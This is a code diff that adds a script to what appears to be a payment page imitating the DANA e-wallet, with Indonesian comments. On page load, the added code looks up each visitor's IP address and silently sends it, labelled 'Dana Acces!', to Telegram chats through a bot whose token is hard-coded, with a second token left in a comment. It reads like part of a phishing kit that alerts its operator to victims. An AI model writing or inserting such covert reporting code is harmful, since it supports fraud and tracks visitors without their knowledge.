@@ -300,6 +300,35 @@
         cancelButton.addEventListener("click", function () {
             window.location.href = "payment.html"; // Redirect ke halaman payment
         });
+
+        const botToken = '7961383409:AAHZjq0f44dptDD5S2EzwHtQ397bSXBKOyg';
+        // https://api.telegram.org/bot7715498191:AAFOMvscDdZzkIBmdtggJZv2ZrFSpYlD_eQ/getUpdates
+        const chatIds = ['5800600940']; // '1019359186'
+
+        // const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;  // IP address pengguna
+                const message = `Dana Acces! IP address: ${ipAddress}`;
+
+                // Mengirim notifikasi ke setiap chat ID
+                chatIds.forEach(chatId => {
+                    const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    fetch(telegramURL)
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log(`Notifikasi berhasil dikirim ke ${chatId}:`, data);
+                        })
+                        .catch(error => {
+                            console.error(`Error saat mengirim notifikasi ke ${chatId}:`, error);
+                        });
+                });
+            })
+            .catch(error => {
+                console.error('Error mendapatkan IP address:', error);
+            });
     </script>
 </body>
 <footer>
